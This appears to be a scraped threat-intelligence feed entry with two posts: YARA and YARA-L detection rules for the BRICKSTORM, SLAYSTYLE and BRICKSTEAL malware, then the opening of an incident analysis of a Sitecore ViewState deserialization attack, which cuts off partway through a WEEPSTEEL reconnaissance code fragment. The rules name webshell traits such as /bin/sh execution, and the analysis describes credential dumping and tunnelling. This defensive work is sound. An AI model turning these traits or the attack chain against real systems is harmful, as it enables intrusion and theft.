\"/libs/fs.(*RemoteDriver).MakeDir\"\n\t\t$ = \"/libs/fs.(*RemoteDriver).GetFile\"\n\t\t$ = \"/libs/fs.(*RemoteDriver).PutFile\"\n\t\t$ = \"/libs/fs.(*RemoteDriver).UpFile\"\n\t\t$ = \"/libs/fs.(*RemoteDriver).MD5\"\n\t\t$ = \"/libs/doh/doh.go\"\n\t\t$ = \"/core/protocol/websocket/config.go\"\n\t\t$ = \"/core/extends/command/command.go\"\n\t\t$ = \"/libs/fs/driver_unix.go\"\n\t\t$ = \"/libs/fs/perm_linux.go\"\n\tcondition:\n\t\tuint32(0) == 0x464c457f and 8 of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">G_APT_Backdoor_BRICKSTORM_2</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_APT_Backdoor_BRICKSTORM_2 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$str1 = { 0F 57 C0 0F 11 84 ?? ?? ?? ?? ?? C6 44 ?? ?? 00 4? C7 84 ?? ?? ?? ?? ?? 00 00 00 00 0F 57 C0 0F 11 84 ?? ?? ?? ?? ?? 0F 11 84 ?? ?? ?? ?? ?? 4? 8B 84 ?? ?? ?? ?? ?? 4? 89 04 ?? 4? 8B 8C ?? ?? ?? ?? ?? 4? 89 4C ?? ?? E8 ?? ?? ?? ?? 4? 83 7C ?? ?? 00 0F 84 ?? ?? ?? ?? 4? 8D 05 ?? ?? ?? ?? 4? 89 ?? ?? E8 ?? ?? ?? ?? 4? 8B 7C ?? ?? 4? 8B 84 ?? ?? ?? ?? ?? 4? 89 47 08 83 3D ?? ?? ?? ?? 00 75 ?? 4? 8B 84 ?? ?? ?? ?? ?? 4? 89 07 4? 89 BC ?? ?? ?? ?? ?? 4? C7 84 ?? ?? ?? ?? ?? 01 00 00 00 4? C7 84 ?? ?? ?? ?? ?? 01 00 00 00 0F 57 C0 0F 11 84 ?? ?? ?? ?? ?? 4? 8B ?? ?? ?? ?? ?? ?? 4? 81 C4 ?? ?? ?? ?? C3 }\n\t\t$str2 = { 4? C7 84 ?? ?? ?? ?? ?? 00 00 00 00 4? C7 84 ?? ?? ?? ?? ?? 00 00 00 00 4? C7 84 ?? ?? ?? ?? ?? 00 00 00 00 4? C7 84 ?? ?? ?? ?? ?? 00 00 00 00 4? C7 84 ?? ?? ?? ?? ?? 00 00 00 00 4? 8B 84 ?? ?? ?? ?? ?? 4? 89 04 ?? 4? 8B 8C ?? ?? ?? ?? ?? 4? 89 4C ?? ?? E8 ?? ?? ?? ?? 4? 8B 44 ?? ?? 4? 85 C0 0F 84 ?? ?? ?? ?? 4? 8D 05 ?? ?? ?? ?? 4? 89 ?? ?? E8 ?? ?? ?? ?? 4? 8B 44 ?? ?? 4? 8B 8C ?? ?? ?? ?? ?? 4? 89 48 08 8B 0D ?? ?? ?? ?? 85 C9 75 ?? 4? 8B 8C ?? ?? ?? ?? ?? 4? 89 08 84 00 4? 89 84 ?? ?? ?? ?? ?? 4? C7 84 ?? ?? ?? ?? ?? 01 00 00 00 4? C7 84 ?? ?? ?? ?? ?? 01 00 00 00 4? C7 84 ?? ?? ?? ?? ?? 00 00 00 00 4? C7 84 ?? ?? ?? ?? ?? 00 00 00 00 90 E8 ?? ?? ?? ?? 4? 8B ?? ?4 D8 00 00 00 4? 81 C4 E0 00 00 00 C3 }\n\tcondition:\n\t\tuint32be(0) == 0x7F454C46 and any of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">G_APT_BackdoorWebshell_SLAYSTYLE_1</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_APT_BackdoorWebshell_SLAYSTYLE_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$str1 = /String \\w{1,10}=request\\.getParameter\\(\\\"\\w{1,15}\\\"\\);/ ascii wide nocase\n\t\t$str2 = \"=new String(java.util.Base64.getDecoder().decode(\" ascii wide nocase\n\t\t$str21 = /String\\[\\]\\s\\w{1,10}=\\{\\\"\\/bin\\/sh\\\",\\\"-c\\\",\\w{1,10}\\+\\\"\\s2&gt;&amp;1\\\"\\};/ ascii wide nocase\n\t\t$str3 = \"= Runtime.getRuntime().exec(\" ascii wide nocase\n\t\t$str4 = \"java.io.InputStream\" ascii wide nocase\n\t\t$str5 = \"java.util.Base64.getEncoder().encodeToString(org.apache.commons.io.IOUtils.toByteArray(\" ascii wide nocase\n\tcondition:\n\t\tfilesize &lt; 5MB and all of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">G_APT_BackdoorWebshell_SLAYSTYLE_2</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_APT_BackdoorWebshell_SLAYSTYLE_2 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$str1 = \"request.getParameter\" nocase\n\t\t$str2 = \"/bin/sh\"\n\t\t$str3 = \"java.io.InputStream\" nocase\n\t\t$str4 = \"Runtime.getRuntime().exec(\" nocase\n\t\t$str5 = \"2&gt;&amp;1\"\n\tcondition:\n\t\t(uint16(0) != 0x5A4D and uint32(0) != 0x464C457F) and filesize &lt; 7KB and all of them and @str4 &gt; @str2\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">G_Backdoor_BRICKSTEAL_1</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Backdoor_BRICKSTEAL_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$str1 = \"comvmware\"\n\t\t$str2 = \"abcdABCD1234!@#$\"\n\t\t$str3 = \"ads.png\"\n\t\t$str4 = \"User-Agent\"\n\t\t$str5 = \"com/vmware/\"\n\tcondition:\n\t\tall of them and filesize &lt; 10KB\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">G_Dropper_BRICKSTEAL_1</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Dropper_BRICKSTEAL_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$str1 = \"Base64.getDecoder().decode\"\n\t\t$str2 = \"Thread.currentThread().getContextClassLoader()\"\n\t\t$str3 = \".class.getDeclaredMethod\"\n\t\t$str4 = \"byte[].class\"\n\t\t$str5 = \"method.invoke\"\n\t\t$str6 = \"filterClass.newInstance()\"\n\t\t$str7 = \"/websso/SAML2/SSO/*\"\n\tcondition:\n\t\tall of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">G_Dropper_BRICKSTEAL_2</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Dropper_BRICKSTEAL_2 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$str1 = /\\(Class&lt;\\?&gt;\\)\\smethod\\.invoke\\(\\w{1,20},\\s\\w{1,20},\\s0,\\s\\w{1,20}\\.length\\);/i ascii wide\n\t\t$str2 = \"(\\\"yv66vg\" ascii wide\n\t\t$str3 = \"request.getSession().getServletContext\" ascii wide\n\t\t$str4 = \".getClass().getDeclaredField(\" ascii wide\n\t\t$str5 = \"new FilterDef();\" ascii wide\n\t\t$str6 = \"new FilterMap();\" ascii wide\n\tcondition:\n\t\tall of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3>Network Detections</h3>\n<p><a href=\"https://cloud.google.com/chronicle/docs/detection/windows-threats-category\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google SecOps</span></a><span style=\"vertical-align: baseline;\"> customers have access to these broad category rules and more under the Mandiant Front-Line Threats rule pack. The following are <a href=\"https://cloud.google.com/chronicle/docs/detection/yara-l-2-0-overview\" rel=\"noopener nofollow noreferrer\" target=\"_blank\">YARA-L 2.0 rules</a> for use in Google Security Operations; however, their logic can be replicated into other formats for use in other security products.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Multiple DNS-over-HTTPS Services Queried</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule hunting_t1071_001_multiple_dns_over_https_services_queried {\n  meta:\n    rule_name = \"Multiple DNS-over-HTTPS Services Queried\"\n    severity = \"Low\"\n    tactic = \"TA0011\" // Command and Control\n    technique = \"T1071.001\" // Application Layer Protocol: Web Protocols\n    reference = \"https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign\"\n    description = \"Detects on requests by a source IP address to DNS-over-HTTPS (DoH) resolver IP addresses associated with multiple services, such as Quad9, Google DNS, and CloudFlare DNS. DoH is a protocol that encrypts DNS queries and responses using the HTTPS protocol. Threat actors may use DoH to obfuscate domain names associated with their externally hosted infrastructure that would otherwise be visible in standard DNS queries.\"\n\n  events:\n    $e.metadata.event_type = \"NETWORK_CONNECTION\"\n    $e.target.ip = /^(8\\.8\\.8\\.8|8\\.8\\.4\\.4|9\\.9\\.9\\.9|9\\.9\\.9\\.11|1\\.1\\.1\\.1|1\\.0\\.0\\.1|45\\.90\\.28\\.160|45\\.90\\.30\\.160|149\\.112\\.112\\.112|149\\.112\\.112\\.11)$/ nocase\n    (\n      $e.target.port = 443 or\n      $e.target.url = /dns-query|:443\\/$|\\d\\.\\d\\.\\d\\.\\d\\/$/ nocase\n    )\n    $source_entity = strings.coalesce($e.principal.asset_id,$e.principal.ip)\n\n  match:\n    $source_entity over 2h\n\n  outcome:\n    $risk_score = max(35)\n    $unique_doh_ips_count = count_distinct($e.target.ip)\n\n  condition:\n    $e and $unique_doh_ips_count &gt;= 5\n\n  options:\n    allow_zero_values = true\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Unknown Endpoint Generating DNS-over-HTTPS and Web Application Development Services Communication</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule hunting_t1071_001_unknown_endpoint_generating_doh_and_web_development_services_communication {\n  meta:\n    rule_name = \"Unknown Endpoint Generating DNS-over-HTTPS and Web Application Development Services Communication\"\n    severity = \"Medium\"\n    tactic = \"TA0011\" // Command and Control\n    technique = \"T1071.001\" // Application Layer Protocol: Web Protocols\n    reference = \"https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign\"\n    description = \"Detects on requests by an unknown source IP address to multiple DNS-over-HTTPS (DoH) resolver services and web application development services, such as Cloudflare Workers or Heroku hosted web applications. To investigate this activity further, determine the source of the network activity and verify if the communication is consistent with the device's intended use and standard allow-list domains.\"\n\n  events:\n    $c1.metadata.event_type = \"NETWORK_CONNECTION\"\n    $c1.target.ip = /^(8\\.8\\.8\\.8|8\\.8\\.4\\.4|9\\.9\\.9\\.9|9\\.9\\.9\\.11|1\\.1\\.1\\.1|1\\.0\\.0\\.1|45\\.90\\.28\\.160|45\\.90\\.30\\.160|149\\.112\\.112\\.112|149\\.112\\.112\\.11)$/ nocase\n    $c1.principal.hostname = \"\"\n    $c1.principal.asset_id = \"\"\n    (\n      $c1.target.port = 443 or\n      $c1.target.url = /dns-query|:443\\/$|\\d\\.\\d\\.\\d\\.\\d\\/$/ nocase\n    )\n    $c2.metadata.event_type = \"NETWORK_CONNECTION\"\n    $c2.target.hostname = /\\.workers\\.dev$|\\.herokuapp\\.com$/ nocase\n    $c2.principal.hostname = \"\"\n    $c2.principal.asset_id = \"\"\n    $c2.target.port = 443\n    $source_entity = $c1.principal.ip\n    $source_entity = $c2.principal.ip\n\n  match:\n    $source_entity over 24h\n\n  outcome:\n    $risk_score = max(65)\n    $unique_doh_ips_count = count_distinct($c1.target.ip)\n\n  condition:\n    $c1 and $c2 and $unique_doh_ips_count &gt;= 3\n\n  options:\n    allow_zero_values = true\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Unknown Endpoint Generating Google DNS-over-HTTPS and Cloudflare Hosted IP Communication</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule hunting_t1071_001_unknown_endpoint_generating_google_doh_and_cloudflare_communication {\n  meta:\n    rule_name = \"Unknown Endpoint Generating Google DNS-over-HTTPS and Cloudflare Hosted IP Communication\"\n    severity = \"Medium\"\n    tactic = \"TA0011\" // Command and Control\n    technique = \"T1071.001\" // Application Layer Protocol: Web Protocols\n    reference = \"https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign\"\n    description = \"Detects on requests by an unknown source IP address to Google DNS-over-HTTPS (DoH) resolver service and a Cloudflare hosted IP address. To investigate this activity further, determine the source of the network activity and verify if the communication is consistent with the device's intended use and standard allow-list domains.\"\n\n  events:\n    $c1.metadata.event_type = \"NETWORK_CONNECTION\"\n    $c1.target.ip = /^(8\\.8\\.8\\.8|8\\.8\\.4\\.4)$/ nocase\n    $c1.principal.hostname = \"\"\n    $c1.principal.asset_id = \"\"\n    (\n      $c1.target.port = 443 or\n      $c1.target.url = /dns-query|:443\\/$|\\d\\.\\d\\.\\d\\.\\d\\/$/ nocase\n    )\n    $c2.metadata.event_type = \"NETWORK_CONNECTION\"\n    $c2.principal.hostname = \"\"\n    $c2.principal.asset_id = \"\"\n    $c2.target.ip_geo_artifact.network.carrier_name = /cloudflare/ nocase\n    $c2.target.port = 443\n    $source_entity = $c1.principal.ip\n    $source_entity = $c2.principal.ip\n\n  match:\n    $source_entity over 1h\n\n  outcome:\n    $risk_score = max(65)\n    $time_diff = math.abs(min($c1.metadata.event_timestamp.seconds) - min($c2.metadata.event_timestamp.seconds))\n\n  condition:\n    $c1 and $c2 and $time_diff &lt;= 2\n\n  options:\n    allow_zero_values = true\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Unknown Endpoint Generating Google DNS-over-HTTPS and Amazon Hosted IP Communication</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule hunting_t1071_001_unknown_endpoint_generating_google_doh_and_amazon_communication {\n  meta:\n    rule_name = \"Unknown Endpoint Generating Google DNS-over-HTTPS and Amazon Hosted IP Communication\"\n    severity = \"Medium\"\n    tactic = \"TA0011\" // Command and Control\n    technique = \"T1071.001\" // Application Layer Protocol: Web Protocols\n    reference = \"https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign\"\n    description = \"Detects on requests by an unknown source IP address to Google DNS-over-HTTPS (DoH) resolver service and an Amazon hosted IP address. To investigate this activity further, determine the source of the network activity and verify if the communication is consistent with the device's intended use and standard allow-list domains.\"\n\n  events:\n    $c1.metadata.event_type = \"NETWORK_CONNECTION\"\n    $c1.target.ip = /^(8\\.8\\.8\\.8|8\\.8\\.4\\.4)$/ nocase\n    $c1.principal.hostname = \"\"\n    $c1.principal.asset_id = \"\"\n    (\n      $c1.target.port = 443 or\n      $c1.target.url = /dns-query|:443\\/$|\\d\\.\\d\\.\\d\\.\\d\\/$/ nocase\n    )\n    $c2.metadata.event_type = \"NETWORK_CONNECTION\"\n    $c2.principal.hostname = \"\"\n    $c2.principal.asset_id = \"\"\n    $c2.target.ip_geo_artifact.network.carrier_name = /amazon/ nocase\n    $c2.target.port = 443\n    $source_entity = $c1.principal.ip\n    $source_entity = $c2.principal.ip\n\n  match:\n    $source_entity over 24h\n\n  outcome:\n    $risk_score = max(65)\n    $time_diff = math.abs(min($c1.metadata.event_timestamp.seconds) - min($c2.metadata.event_timestamp.seconds))\n\n  condition:\n    // As observed by Mandiant IR, the two connection events to DoH and Amazon occurred nearly simultaneously\n    $c1 and $c2 and $time_diff &lt;= 2\n\n  options:\n    allow_zero_values = true\n}</code></pre></div>"}
{"source": "Threat Intelligence", "title": "ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690)", "link": "https://cloud.google.com/blog/topics/threat-intelligence/viewstate-deserialization-zero-day-vulnerability/", "published": "Wed, 03 Sep 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Rommel Joven, Josh Fleischer, Joseph Sciuto, Andi Slok, Choon Kiat Ng</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><em>Update (September 3): This post was updated to include information about GoTokenTheft usage.</em></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In a recent investigation, <a href=\"https://cloud.google.com/security/products/mandiant-managed-threat-hunting\">Mandiant Threat Defense</a> discovered an active ViewState deserialization attack affecting Sitecore deployments leveraging a sample machine key that had been exposed in Sitecore deployment guides from 2017 and earlier. An attacker leveraged the exposed ASP.NET machine key to perform remote code execution.</span></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant worked directly with Sitecore to address this issue. Sitecore tracks this vulnerable configuration as <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-53690\" rel=\"noopener\" target=\"_blank\">CVE-2025-53690</a>, which affects customers who deployed any version of multiple Sitecore products using the sample key exposed in publicly available deployment guides (specifically Sitecore XP 9.0 and Active Directory 1.4 and earlier versions). Sitecore has confirmed that its updated deployments automatically generate a unique machine key and that affected customers have been notified.</span></p>\n<p><span style=\"vertical-align: baseline;\">Refer to </span><a href=\"https://support.sitecore.com/kb?id=kb_article_view&amp;sysparm_article=KB1003865\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Sitecore’s advisory</span></a><span style=\"vertical-align: baseline;\"> for more information on which products are potentially impacted.</span> </p>\n<h3><span style=\"vertical-align: baseline;\">Summary</span></h3>\n<p><span style=\"vertical-align: baseline;\">Mandiant successfully disrupted the attack shortly after initiating rapid response, which ultimately prevented us from observing the full attack lifecycle. However, our investigation still provided insights into the adversary's activity. The attacker's deep understanding of the compromised product and the exploited vulnerability was evident in their progression from initial server compromise to privilege escalation. Key events in this attack chain included: </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Initial compromise was achieved by exploiting the </span><code style=\"vertical-align: baseline;\">ViewState Deserialization</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">vulnerability </span><code style=\"vertical-align: baseline;\">CVE-2025-53690</code><span style=\"vertical-align: baseline;\"> on the affected internet-facing </span><code style=\"vertical-align: baseline;\">Sitecore</code><span style=\"vertical-align: baseline;\"> instance, resulting in remote code execution.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">A decrypted ViewState payload contained </span><span style=\"vertical-align: baseline;\">WEEPSTEEL</span><span style=\"vertical-align: baseline;\">, a malware designed for internal reconnaissance.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Leveraging this access, the threat actor archived the root directory of the web application, indicating an intent to obtain sensitive files such as </span><code style=\"vertical-align: baseline;\">web.config</code><span style=\"vertical-align: baseline;\">. This was followed by host and network reconnaissance.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The threat actor staged tooling in a public directory which included an:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Open-source network tunnel tool, </span><code style=\"vertical-align: baseline;\">EARTHWORM</code><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Open-source remote access tool,</span><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">DWAGENT</code></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Open-source Active Directory (AD) reconnaissance tool, </span><code style=\"vertical-align: baseline;\">SHARPHOUND </code></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Local administrator accounts were created and used to dump </span><code style=\"vertical-align: baseline;\">SAM</code><code style=\"vertical-align: baseline;\">/</code><code style=\"vertical-align: baseline;\">SYSTEM</code><span style=\"vertical-align: baseline;\"> hives in an attempt to compromise cached administrator credentials. The compromised credentials then enabled lateral movement via </span><code style=\"vertical-align: baseline;\">RDP</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">DWAgent</code><span style=\"vertical-align: baseline;\"> provided persistent remote access and was used for Active Directory reconnaissance.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"attack lifecycle sitecore\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/viewstate-sitecore-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Attack lifecycle</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Initial Compromise</span></h3>\n<h4><span style=\"vertical-align: baseline;\">External Reconnaissance</span></h4>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">The threat actor began their operation by probing the victim's web server with HTTP requests to various endpoints before ultimately shifting their attention to the </span><code style=\"vertical-align: baseline;\">/sitecore/blocked.aspx</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">page. This page is a legitimate Sitecore component that simply returns a message if a request was blocked due to licensing issues. </span><span style=\"vertical-align: baseline;\">T</span><span style=\"vertical-align: baseline;\">he page’s use of a hidden ViewState form (a standard ASP.NET feature), </span><span style=\"vertical-align: baseline;\">combined with being accessible without authentication, made it a potential target for ViewState deserialization attacks.</span></span></p>\n<h4><span style=\"vertical-align: baseline;\">ViewState Deserialization Attack</span></h4>\n<p><span style=\"vertical-align: baseline;\">ViewStates are an ASP.NET feature designed to persist the state of webpages by storing it in a hidden HTML field named </span><code style=\"vertical-align: baseline;\">__VIEWSTATE</code><span style=\"vertical-align: baseline;\">. ViewState deserialization attacks exploit the server's willingness to deserialize ViewState messages when validation mechanisms are either absent or circumvented. When machine keys (which protect ViewState integrity and confidentiality) are compromised, the application effectively loses its ability to differentiate between legitimate and malicious ViewState payloads sent to the server.</span></p>\n<p><span style=\"vertical-align: baseline;\">Local web server (IIS) logs recorded that the threat actor's attack began by sending an HTTP POST request to the </span><code style=\"vertical-align: baseline;\">blocked.aspx</code><span style=\"vertical-align: baseline;\"> endpoint, which was met with an HTTP 302 \"Found\" response. This web request coincided with a \"</span><code style=\"vertical-align: baseline;\">ViewState verification failed</code><span style=\"vertical-align: baseline;\">\" message in Windows application event logs (Event ID </span><code style=\"vertical-align: baseline;\">1316</code><span style=\"vertical-align: baseline;\">) containing the crafted ViewState payload sent by the threat actor:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>Log: Application\nSource: ASP.NET 4.0.30319.0\nEID: 1316\nType: Information\n\nEvent code: 4009-++-Viewstate verification failed. Reason: Viewstate was \ninvalid.\n\n&lt;truncated&gt;\n\nViewStateException information:\n    Exception message: Invalid viewstate.\n    Client IP: &lt;redacted&gt;\n    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; \nTrident/5.0) chromeframe/10.0.648.205 Mozilla/5.0 \n(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) \nChrome/121.0.0.0 Safari/537.36\n    PersistedState: &lt;27760 byte encrypted + base64 encoded payload&gt;\n    Referer: \n    Path: /sitecore/blocked.aspx</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">This demonstrates the threat actor’s knowledge of the server’s machine key, allowing them to craft </span><span style=\"vertical-align: baseline;\">malicious</span><span style=\"vertical-align: baseline;\"> viewstate requests </span><span style=\"vertical-align: baseline;\">using tools like the public </span><code style=\"vertical-align: baseline;\">ysoserial.net</code><span style=\"vertical-align: baseline;\"> project</span>. </span></p>\n<h4><span style=\"vertical-align: baseline;\">Initial Host Reconnaissance</span></h4>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Mandiant recovered a copy of the server's machine key, which was stored in the ASP.NET configuration file </span><code style=\"vertical-align: baseline;\">web.config</code>. Mandiant decrypted the threat actor’s ViewState payload using this key and found it contained an embedded .NET assembly named </span><code style=\"vertical-align: baseline;\">Information.dll</code><span style=\"vertical-align: baseline;\">. This assembly, which Mandiant tracks as </span><code style=\"vertical-align: baseline;\">WEEPSTEEL</code><span style=\"vertical-align: baseline;\">, <span style=\"vertical-align: baseline;\">functions as an internal reconnaissance tool and has similarities to the </span><a href=\"https://securelist.com/ghostcontainer/116953/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GhostContainer backdoor</span></a><span style=\"vertical-align: baseline;\"> and an </span><a href=\"https://labs.withsecure.com/publications/toolshell#:~:text=payload%20function%20names-,%E2%80%9CInformation%E2%80%9D%20payload,-Information%20gathering%20module\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">information-gathering payload</span></a><span style=\"vertical-align: baseline;\"> previously observed in the wild</span></span><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 70%; margin-left: auto; margin-right: auto;\">\n<tbody>\n<tr>\n<td style=\"width: 100%;\">\n<p><strong><span style=\"vertical-align: baseline;\">About WEEPSTEEL</span></strong></p>\n<p><code style=\"vertical-align: baseline;\">WEEPSTEEL</code> <span style=\"vertical-align: baseline;\">is a reconnaissance tool designed to gather system, network, and user information. This data is then encrypted and exfiltrated to the attacker by disguising it as a benign </span><code style=\"vertical-align: baseline;\">__VIEWSTATE</code><span style=\"vertical-align: baseline;\"> response.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">The payload is designed to exfiltrate the following system information for reconnaissance</span>:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>// Code Snippet from Host Reconnaissance Function\nInformation.BasicsInfo basicsInfo = new Information.BasicsInfo\n{\n\tDirectories = new Information.Directories\n\t{\n\t\tCurrentWebDirectory = HostingEnvironment.MapPath(\"~/\")\n\t},\n// Gather system information\n\tOperatingSystemInformation = Information.GetOperatingSystemInformation(),\n\tDiskInformation = 